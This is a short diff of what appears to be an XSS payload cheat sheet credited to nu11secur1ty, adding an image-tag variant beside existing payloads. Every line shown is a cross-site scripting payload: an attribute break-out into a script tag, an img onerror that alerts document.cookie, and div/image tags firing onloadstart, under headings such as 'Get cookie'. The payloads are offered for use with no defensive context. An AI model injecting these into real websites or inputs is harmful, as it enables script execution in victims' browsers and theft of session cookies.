@@ -10,9 +10,11 @@ qnlxv"><script>alert('hello from nu11secur1ty')</script>sad4r
 ```mysql
 <img src="" onerror="alert(document.cookie)">
 ```
-## Non ExistantImage
+## Non ExistantImage and Existant
 ```
 <div><image src=validateNonExistantImage.png onloadstart=alert(1337)> hey girl hey </div>
+<div><image src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp onloadstart=alert(1337)> hey girl hey </div>
+
 ```
 ## Get cookie
 ```
